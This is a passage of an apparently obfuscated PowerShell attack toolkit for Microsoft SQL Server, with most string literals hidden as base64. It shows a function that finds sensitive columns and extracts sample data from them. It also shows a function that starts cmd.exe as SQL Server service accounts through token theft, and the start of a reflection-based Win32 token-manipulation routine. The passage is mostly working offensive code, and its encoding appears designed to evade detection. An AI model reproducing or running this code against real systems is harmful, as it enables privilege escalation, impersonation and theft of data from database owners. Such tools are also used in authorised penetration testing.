            Write-Verbose -Message "$Instance : CONNECTION SUCCESS"
        }
        if($Exploit)
        {
            $TestMode  = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHAAbABvAGkAdAA=')))
        }
        else
        {
            $TestMode  = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AGQAaQB0AA==')))
        }
        $Vulnerability = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHQAZQBuAHQAaQBhAGwAbAB5ACAAUwBlAG4AcwBpAHQAaQB2AGUAIABDAG8AbAB1AG0AbgBzACAARgBvAHUAbgBkAA==')))
        $Description   = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAGwAdQBtAG4AcwAgAHcAZQByAGUAIABmAG8AdQBuAGQAIABpAG4AIABuAG8AbgAgAGQAZQBmAGEAdQBsAHQAIABkAGEAdABhAGIAYQBzAGUAcwAgAHQAaABhAHQAIABtAGEAeQAgAGMAbwBuAHQAYQBpAG4AIABzAGUAbgBzAGkAdABpAHYAZQAgAGkAbgBmAG8AcgBtAGEAdABpAG8AbgAuAA==')))
        $Remediation   = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBuAHMAdQByAGUAIAB0AGgAYQB0ACAAYQBsAGwAIABwAGEAcwBzAHcAbwByAGQAcwAgAGEAbgBkACAAcwBlAG4AcwB0AGkAdgBlACAAZABhAHQAYQAgAGEAcgBlACAAbQBhAHMAawBlAGQALAAgAGgAYQBzAGgAZQBkACwAIABvAHIAIABlAG4AYwByAHkAcAB0AGUAZAAuAA==')))
        $Severity      = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAGYAbwByAG0AYQB0AGkAbwBuAGEAbAA=')))
        $IsVulnerable  = 'No'
        $IsExploitable = 'No'
        $Exploited     = 'No'
        $ExploitCmd    = "Invoke-SQLAuditSampleDataByColumn -Instance $Instance -Exploit"
        $Details       = ''
        $Reference     = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcABzADoALwAvAG0AcwBkAG4ALgBtAGkAYwByAG8AcwBvAGYAdAAuAGMAbwBtAC8AZQBuAC0AdQBzAC8AbABpAGIAcgBhAHIAeQAvAG0AcwAxADgAOAAzADQAOAAuAGEAcwBwAHgA')))
        $Author        = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBjAG8AdAB0ACAAUwB1AHQAaABlAHIAbABhAG4AZAAgACgAQABfAG4AdQBsAGwAYgBpAG4AZAApACwAIABOAGUAdABTAFAASQAgADIAMAAxADYA')))
        Write-Verbose -Message "$Instance : - Searching for column names that match criteria..."
        $Columns = Get-SQLColumn -Instance $Instance -Username $Username -Password $Password -Credential $Credential -ColumnNameSearch $Keyword -NoDefaults -SuppressVerbose
        if($Columns)
        {
            $IsVulnerable  = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBlAHMA')))
        }
        else
        {
            $IsVulnerable  = 'No'
        }
        if($IsVulnerable -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBlAHMA'))))
        {
            $Columns|
            % -Process {
                $DatabaseName = $_.DatabaseName
                $SchemaName = $_.SchemaName
                $TableName = $_.TableName
                $ColumnName = $_.ColumnName
                $AffectedColumn = "[$DatabaseName].[$SchemaName].[$TableName].[$ColumnName]"
                $AffectedTable = "[$DatabaseName].[$SchemaName].[$TableName]"
                $Query = "USE $DatabaseName; SELECT TOP $SampleSize [$ColumnName] FROM $AffectedTable "
                Write-Verbose -Message "$Instance : - Column match: $AffectedColumn"
                if($IsVulnerable -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBlAHMA'))))
                {
                    $TblTargetColumns |
                    % -Process {
                        Write-Verbose -Message "$Instance : - EXPLOITING: Selecting data sample from column $AffectedColumn."
                        $DataSample = Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query $Query -SuppressVerbose |
                        ConvertTo-Csv -NoTypeInformation |
                        select -Skip 1
                        if($DataSample)
                        {
                            $Details = "Data sample from $AffectedColumn : $DataSample."
                        }
                        else
                        {
                            $Details = "No data found in affected column: $AffectedColumn."
                        }
                        $IsExploitable = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBlAHMA')))
                        $Exploited = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBlAHMA')))
                        $null = $TblData.Rows.Add($ComputerName, $Instance, $Vulnerability, $Description, $Remediation, $Severity, $IsVulnerable, $IsExploitable, $Exploited, $ExploitCmd, $Details, $Reference, $Author)
                    }
                }
                else
                {
                    $Details = "Affected column: $AffectedColumn."
                    $IsExploitable = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBlAHMA')))
                    $null = $TblData.Rows.Add($ComputerName, $Instance, $Vulnerability, $Description, $Remediation, $Severity, $IsVulnerable, $IsExploitable, $Exploited, $ExploitCmd, $Details, $Reference, $Author)
                }
            }
        }
        else
        {
            Write-Verbose -Message "$Instance : - No columns were found that matched the search."
        }
        Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: SEARCH DATA BY COLUMN"
    }
    End
    {
        if ( -not $NoOutput)
        {
            Return $TblData
        }
    }
}
Function Invoke-SQLImpersonateServiceCmd
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Executable to run. Cmd.exe and Ssms.exe are recommended.')]
        [string]$Exe = 'cmd.exe',
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Only run commands in the context of SQL Server database engine service accounts.')]
        [switch]$EngineOnly
    )
    Begin {
        Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBlAHIAaQBmAHkAaQBuAGcAIABsAG8AYwBhAGwAIABhAGQAbQBpAG4AcwBpAHQAcgBhAHQAbwByACAAcAByAGkAdgBpAGwAZQBnAGUAcwAuAC4ALgA=')))
        $CurrentIdentity = [System.Security.Principal.WindowsIdentity]::GetCurrent()
        $prp = New-Object -TypeName System.Security.Principal.WindowsPrincipal -ArgumentList ($CurrentIdentity)
        $adm = [System.Security.Principal.WindowsBuiltInRole]::Administrator
        $IsAdmin = $prp.IsInRole($adm)
        if($IsAdmin){
             Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABoAGUAIABjAHUAcgByAGUAbgB0ACAAdQBzAGUAcgAgAGgAYQBzACAAbABvAGMAYQBsACAAYQBkAG0AaQBuAGkAcwB0AHIAYQB0AG8AcgAgAHAAcgBpAHYAaQBsAGUAZwBlAHMALgA=')))
        }else{
             Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABoAGUAIABjAHUAcgByAGUAbgB0ACAAdQBzAGUAcgAgAEQATwBFAFMAIABOAE8AVAAgAGgAYQB2AGUAIABsAG8AYwBhAGwAIABhAGQAbQBpAG4AaQBzAHQAcgBhAHQAbwByACAAcAByAGkAdgBpAGwAZQBnAGUAcwAuACAAQQBiAG8AcgB0AGkAbgBnAC4A')))
             return
        }
    }
    Process {
        echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvAHQAZQA6ACAAVABoAGUAIAB2AGUAcgBiAG8AcwBlACAAZgBsAGEAZwAgAHcAaQBsAGwAIABnAGkAdgBlACAAeQBvAHUAIABtAG8AcgBlACAAaQBuAGYAbwAgAGkAZgAgAHkAbwB1ACAAbgBlAGUAZAAgAGkAdAAuAA==')))
        Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBhAHQAaABlAHIAaQBuAGcAIABsAGkAcwB0ACAAbwBmACAAUwBRAEwAIABTAGUAcgB2AGUAcgAgAHMAZQByAHYAaQBjAGUAcwAgAHIAdQBuAG4AaQBuAGcAIABsAG8AYwBhAGwAbAB5AC4ALgAuAA==')))
        if($EngineOnly){
            $LocalSQLServices = Get-SQLServiceLocal -Instance $Instance -RunOnly | ? {$_.ServicePath -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBzAHEAbABzAGUAcgB2AHIALgBlAHgAZQAqAA==')))}  | sort Instance
            Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBuAGwAeQAgAHQAaABlACAAZABhAHQAYQBiAGEAcwBlACAAZQBuAGcAaQBuAGUAIABzAGUAcgB2AGkAYwBlACAAYQBjAGMAbwB1AG4AdABzACAAdwBpAGwAbAAgAGIAZQAgAHQAYQByAGcAZQB0AGUAZAAuAA==')))
        }else{
            $LocalSQLServices = Get-SQLServiceLocal -Instance $Instance -RunOnly | sort Instance
        }
        Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBhAHQAaABlAHIAaQBuAGcAIABsAGkAcwB0ACAAbwBmACAAbABvAGMAYQBsACAAcAByAG8AYwBlAHMAcwBlAHMALgAuAC4A')))
        $LocalProcesses = gwmi -Class win32_process | select processid,ExecutablePath
        Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABhAHIAZwBlAHQAaQBuAGcAIABTAFEATAAgAFMAZQByAHYAZQByACAAcAByAG8AYwBlAHMAcwBlAHMALgAuAC4A')))        
        $LocalSQLServices |
        % {
            $s_pathname = $_.ServicePath.Split("`"")[1]
            $s_displayname = $_.ServiceDisplayName
            $s_serviceaccount = $_.ServiceAccount   
            $s_instance = $_.Instance  
            $LocalProcesses | 
            % {
                $p_ExecutablePath = $_.ExecutablePath
                $p_processid = $_.processid
                if($s_pathname -like "$p_ExecutablePath"){
                    echo "$s_instance - Service: $s_displayname - Running command `"$Exe`" as $s_serviceaccount"
                    $MyCmd = "/C $Exe"
                    Invoke-TokenManipulation -CreateProcess $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwBtAGQALgBlAHgAZQA='))) -ProcessArgs $MyCmd -ProcessId $p_processid -ErrorAction SilentlyContinue
                }
            }               
        }               
    }
    End {
        echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBsAGwAIABkAG8AbgBlAC4A')))
    }
}
function Invoke-TokenManipulation
{
    [CmdletBinding(DefaultParameterSetName="Enumerate")]
    Param(
        [Parameter(ParameterSetName = "Enumerate")]
        [Switch]
        $Enumerate,
        [Parameter(ParameterSetName = "RevToSelf")]
        [Switch]
        $RevToSelf,
        [Parameter(ParameterSetName = "ShowAll")]
        [Switch]
        $ShowAll,
        [Parameter(ParameterSetName = "ImpersonateUser")]
        [Switch]
        $ImpersonateUser,
        [Parameter(ParameterSetName = "CreateProcess")]
        [String]
        $CreateProcess,
        [Parameter(ParameterSetName = "WhoAmI")]
        [Switch]
        $WhoAmI,
        [Parameter(ParameterSetName = "ImpersonateUser")]
        [Parameter(ParameterSetName = "CreateProcess")]
        [String]
        $Username,
        [Parameter(ParameterSetName = "ImpersonateUser")]
        [Parameter(ParameterSetName = "CreateProcess")]
        [Int]
        $ProcessId,
        [Parameter(ParameterSetName = "ImpersonateUser", ValueFromPipeline=$true)]
        [Parameter(ParameterSetName = "CreateProcess", ValueFromPipeline=$true)]
        [System.Diagnostics.Process]
        $Process,
        [Parameter(ParameterSetName = "ImpersonateUser")]
        [Parameter(ParameterSetName = "CreateProcess")]
        $ThreadId,
        [Parameter(ParameterSetName = "CreateProcess")]
        [String]
        $ProcessArgs,
        [Parameter(ParameterSetName = "CreateProcess")]
        [Switch]
        $NoUI,
        [Parameter(ParameterSetName = "CreateProcess")]
        [Switch]
        $PassThru,
        [Parameter(Mandatory = $false,ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance
    )
    Set-StrictMode -Version 2
	Function Get-DelegateType
	{
	    Param
	    (
	        [OutputType([Type])]
	        [Parameter( Position = 0)]
	        [Type[]]
	        $Parameters = (New-Object Type[](0)),
	        [Parameter( Position = 1 )]
	        [Type]
	        $ReturnType = [Void]
	    )
	    $Domain = [AppDomain]::CurrentDomain
	    $DynAssembly = New-Object System.Reflection.AssemblyName($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGYAbABlAGMAdABlAGQARABlAGwAZQBnAGEAdABlAA=='))))
	    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
	    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAE0AZQBtAG8AcgB5AE0AbwBkAHUAbABlAA=='))), $false)
	    $TypeBuilder = $ModuleBuilder.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQB5AEQAZQBsAGUAZwBhAHQAZQBUAHkAcABlAA=='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBsAGEAcwBzACwAIABQAHUAYgBsAGkAYwAsACAAUwBlAGEAbABlAGQALAAgAEEAbgBzAGkAQwBsAGEAcwBzACwAIABBAHUAdABvAEMAbABhAHMAcwA='))), [System.MulticastDelegate])
	    $ConstructorBuilder = $TypeBuilder.DefineConstructor($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBUAFMAcABlAGMAaQBhAGwATgBhAG0AZQAsACAASABpAGQAZQBCAHkAUwBpAGcALAAgAFAAdQBiAGwAaQBjAA=='))), [System.Reflection.CallingConventions]::Standard, $Parameters)
	    $ConstructorBuilder.SetImplementationFlags($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgB1AG4AdABpAG0AZQAsACAATQBhAG4AYQBnAGUAZAA='))))
	    $MethodBuilder = $TypeBuilder.DefineMethod($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHYAbwBrAGUA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMALAAgAEgAaQBkAGUAQgB5AFMAaQBnACwAIABOAGUAdwBTAGwAbwB0ACwAIABWAGkAcgB0AHUAYQBsAA=='))), $ReturnType, $Parameters)
	    $MethodBuilder.SetImplementationFlags($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgB1AG4AdABpAG0AZQAsACAATQBhAG4AYQBnAGUAZAA='))))
	    echo $TypeBuilder.CreateType()
	}
	Function Get-ProcAddress
	{
	    Param
	    (
	        [OutputType([IntPtr])]
	        [Parameter( Position = 0, Mandatory = $True )]
	        [String]
	        $Module,
	        [Parameter( Position = 1, Mandatory = $True )]
	        [String]
	        $Procedure
	    )
	    $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
	        ? { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB5AHMAdABlAG0ALgBkAGwAbAA=')))) }
	    $UnsafeNativeMethods = $SystemAssembly.GetType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAGMAcgBvAHMAbwBmAHQALgBXAGkAbgAzADIALgBVAG4AcwBhAGYAZQBOAGEAdABpAHYAZQBNAGUAdABoAG8AZABzAA=='))))
	    $GetModuleHandle = $UnsafeNativeMethods.GetMethod($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQATQBvAGQAdQBsAGUASABhAG4AZABsAGUA'))))
	    $GetProcAddress = $UnsafeNativeMethods.GetMethod($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAUAByAG8AYwBBAGQAZAByAGUAcwBzAA=='))))
	    $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
	    $tmpPtr = New-Object IntPtr
	    $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)
	    echo $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
	}
    $Constants = @{
        ACCESS_SYSTEM_SECURITY = 0x01000000
        READ_CONTROL = 0x00020000
        SYNCHRONIZE = 0x00100000
        STANDARD_RIGHTS_ALL = 0x001F0000
        TOKEN_QUERY = 8
        TOKEN_ADJUST_PRIVILEGES = 0x20
        ERROR_NO_TOKEN = 0x3f0
        SECURITY_DELEGATION = 3
        DACL_SECURITY_INFORMATION = 0x4
        ACCESS_ALLOWED_ACE_TYPE = 0x0
        STANDARD_RIGHTS_REQUIRED = 0x000F0000
        DESKTOP_GENERIC_ALL = 0x000F01FF
        WRITE_DAC = 0x00040000
        OBJECT_INHERIT_ACE = 0x1
        GRANT_ACCESS = 0x1
        TRUSTEE_IS_NAME = 0x1
        TRUSTEE_IS_SID = 0x0
        TRUSTEE_IS_USER = 0x1
        TRUSTEE_IS_WELL_KNOWN_GROUP = 0x5
        TRUSTEE_IS_GROUP = 0x2
        PROCESS_QUERY_INFORMATION = 0x400
        TOKEN_ASSIGN_PRIMARY = 0x1
        TOKEN_DUPLICATE = 0x2
        TOKEN_IMPERSONATE = 0x4
        TOKEN_QUERY_SOURCE = 0x10
        STANDARD_RIGHTS_READ = 0x20000
        TokenStatistics = 10
        TOKEN_ALL_ACCESS = 0xf01ff
        MAXIMUM_ALLOWED = 0x02000000
        THREAD_ALL_ACCESS = 0x1f03ff
        ERROR_INVALID_PARAMETER = 0x57
        LOGON_NETCREDENTIALS_ONLY = 0x2
        SE_PRIVILEGE_ENABLED = 0x2
        SE_PRIVILEGE_ENABLED_BY_DEFAULT = 0x1
        SE_PRIVILEGE_REMOVED = 0x4
    }
    $Win32Constants = New-Object PSObject -Property $Constants
	$Domain = [AppDomain]::CurrentDomain
	$DynamicAssembly = New-Object System.Reflection.AssemblyName($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RAB5AG4AYQBtAGkAYwBBAHMAcwBlAG0AYgBsAHkA'))))
	$AssemblyBuilder = $Domain.DefineDynamicAssembly($DynamicAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
	$ModuleBuilder = $AssemblyBuilder.DefineDynamicModule($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RAB5AG4AYQBtAGkAYwBNAG8AZAB1AGwAZQA='))), $false)
	$ConstructorInfo = [System.Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]
	$TypeBuilder = $ModuleBuilder.DefineEnum($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABPAEsARQBOAF8ASQBOAEYATwBSAE0AQQBUAEkATwBOAF8AQwBMAEEAUwBTAA=='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))), [UInt32])
	$TypeBuilder.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAGsAZQBuAFUAcwBlAHIA'))), [UInt32] 1) | Out-Null
    $TypeBuilder.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAGsAZQBuAEcAcgBvAHUAcABzAA=='))), [UInt32] 2) | Out-Null
    $TypeBuilder.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAGsAZQBuAFAAcgBpAHYAaQBsAGUAZwBlAHMA'))), [UInt32] 3) | Out-Null
    $TypeBuilder.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAGsAZQBuAE8AdwBuAGUAcgA='))), [UInt32] 4) | Out-Null
    $TypeBuilder.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAGsAZQBuAFAAcgBpAG0AYQByAHkARwByAG8AdQBwAA=='))), [UInt32] 5) | Out-Null
    $TypeBuilder.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAGsAZQBuAEQAZQBmAGEAdQBsAHQARABhAGMAbAA='))), [UInt32] 6) | Out-Null
    $TypeBuilder.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAGsAZQBuAFMAbwB1AHIAYwBlAA=='))), [UInt32] 7) | Out-Null
    $TypeBuilder.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAGsAZQBuAFQAeQBwAGUA'))), [UInt32] 8) | Out-Null
    $TypeBuilder.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAGsAZQBuAEkAbQBwAGUAcgBzAG8AbgBhAHQAaQBvAG4ATABlAHYAZQBsAA=='))), [UInt32] 9) | Out-Null
    $TypeBuilder.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAGsAZQBuAFMAdABhAHQAaQBzAHQAaQBjAHMA'))), [UInt32] 10) | Out-Null
    $TypeBuilder.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAGsAZQBuAFIAZQBzAHQAcgBpAGMAdABlAGQAUwBpAGQAcwA='))), [UInt32] 11) | Out-Null
    $TypeBuilder.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAGsAZQBuAFMAZQBzAHMAaQBvAG4ASQBkAA=='))), [UInt32] 12) | Out-Null
    $TypeBuilder.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAGsAZQBuAEcAcgBvAHUAcABzAEEAbgBkAFAAcgBpAHYAaQBsAGUAZwBlAHMA'))), [UInt32] 13) | Out-Null
    $TypeBuilder.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAGsAZQBuAFMAZQBzAHMAaQBvAG4AUgBlAGYAZQByAGUAbgBjAGUA'))), [UInt32] 14) | Out-Null
    $TypeBuilder.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAGsAZQBuAFMAYQBuAGQAQgBvAHgASQBuAGUAcgB0AA=='))), [UInt32] 15) | Out-Null
    $TypeBuilder.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAGsAZQBuAEEAdQBkAGkAdABQAG8AbABpAGMAeQA='))), [UInt32] 16) | Out-Null
    $TypeBuilder.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAGsAZQBuAE8AcgBpAGcAaQBuAA=='))), [UInt32] 17) | Out-Null
    $TypeBuilder.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAGsAZQBuAEUAbABlAHYAYQB0AGkAbwBuAFQAeQBwAGUA'))), [UInt32] 18) | Out-Null
    $TypeBuilder.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAGsAZQBuAEwAaQBuAGsAZQBkAFQAbwBrAGUAbgA='))), [UInt32] 19) | Out-Null
    $TypeBuilder.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAGsAZQBuAEUAbABlAHYAYQB0AGkAbwBuAA=='))), [UInt32] 20) | Out-Null
    $TypeBuilder.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAGsAZQBuAEgAYQBzAFIAZQBzAHQAcgBpAGMAdABpAG8AbgBzAA=='))), [UInt32] 21) | Out-Null
    $TypeBuilder.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAGsAZQBuAEEAYwBjAGUAcwBzAEkAbgBmAG8AcgBtAGEAdABpAG8AbgA='))), [UInt32] 22) | Out-Null
    $TypeBuilder.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAGsAZQBuAFYAaQByAHQAdQBhAGwAaQB6AGEAdABpAG8AbgBBAGwAbABvAHcAZQBkAA=='))), [UInt32] 23) | Out-Null
    $TypeBuilder.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAGsAZQBuAFYAaQByAHQAdQBhAGwAaQB6AGEAdABpAG8AbgBFAG4AYQBiAGwAZQBkAA=='))), [UInt32] 24) | Out-Null
    $TypeBuilder.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAGsAZQBuAEkAbgB0AGUAZwByAGkAdAB5AEwAZQB2AGUAbAA='))), [UInt32] 25) | Out-Null
    $TypeBuilder.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAGsAZQBuAFUASQBBAGMAYwBlAHMAcwA='))), [UInt32] 26) | Out-Null
    $TypeBuilder.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAGsAZQBuAE0AYQBuAGQAYQB0AG8AcgB5AFAAbwBsAGkAYwB5AA=='))), [UInt32] 27) | Out-Null
    $TypeBuilder.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAGsAZQBuAEwAbwBnAG8AbgBTAGkAZAA='))), [UInt32] 28) | Out-Null
    $TypeBuilder.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAGsAZQBuAEkAcwBBAHAAcABDAG8AbgB0AGEAaQBuAGUAcgA='))), [UInt32] 29) | Out-Null
    $TypeBuilder.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAGsAZQBuAEMAYQBwAGEAYgBpAGwAaQB0AGkAZQBzAA=='))), [UInt32] 30) | Out-Null
    $TypeBuilder.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAGsAZQBuAEEAcABwAEMAbwBuAHQAYQBpAG4AZQByAFMAaQBkAA=='))), [UInt32] 31) | Out-Null
    $TypeBuilder.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAGsAZQBuAEEAcABwAEMAbwBuAHQAYQBpAG4AZQByAE4AdQBtAGIAZQByAA=='))), [UInt32] 32) | Out-Null
    $TypeBuilder.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAGsAZQBuAFUAcwBlAHIAQwBsAGEAaQBtAEEAdAB0AHIAaQBiAHUAdABlAHMA'))), [UInt32] 33) | Out-Null
    $TypeBuilder.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAGsAZQBuAEQAZQB2AGkAYwBlAEMAbABhAGkAbQBBAHQAdAByAGkAYgB1AHQAZQBzAA=='))), [UInt32] 34) | Out-Null
    $TypeBuilder.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAGsAZQBuAFIAZQBzAHQAcgBpAGMAdABlAGQAVQBzAGUAcgBDAGwAYQBpAG0AQQB0AHQAcgBpAGIAdQB0AGUAcwA='))), [UInt32] 35) | Out-Null
    $TypeBuilder.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAGsAZQBuAFIAZQBzAHQAcgBpAGMAdABlAGQARABlAHYAaQBjAGUAQwBsAGEAaQBtAEEAdAB0AHIAaQBiAHUAdABlAHMA'))), [UInt32] 36) | Out-Null
    $TypeBuilder.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAGsAZQBuAEQAZQB2AGkAYwBlAEcAcgBvAHUAcABzAA=='))), [UInt32] 37) | Out-Null
    $TypeBuilder.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAGsAZQBuAFIAZQBzAHQAcgBpAGMAdABlAGQARABlAHYAaQBjAGUARwByAG8AdQBwAHMA'))), [UInt32] 38) | Out-Null
    $TypeBuilder.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAGsAZQBuAFMAZQBjAHUAcgBpAHQAeQBBAHQAdAByAGkAYgB1AHQAZQBzAA=='))), [UInt32] 39) | Out-Null
    $TypeBuilder.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAGsAZQBuAEkAcwBSAGUAcwB0AHIAaQBjAHQAZQBkAA=='))), [UInt32] 40) | Out-Null
    $TypeBuilder.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAHgAVABvAGsAZQBuAEkAbgBmAG8AQwBsAGEAcwBzAA=='))), [UInt32] 41) | Out-Null
	$TOKEN_INFORMATION_CLASS = $TypeBuilder.CreateType()
    $Attributes = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
	$TypeBuilder = $ModuleBuilder.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABBAFIARwBFAF8ASQBOAFQARQBHAEUAUgA='))), $Attributes, [System.ValueType], 8)
	$TypeBuilder.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAHcAUABhAHIAdAA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
	$TypeBuilder.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABpAGcAaABQAGEAcgB0AA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
	$LARGE_INTEGER = $TypeBuilder.CreateType()
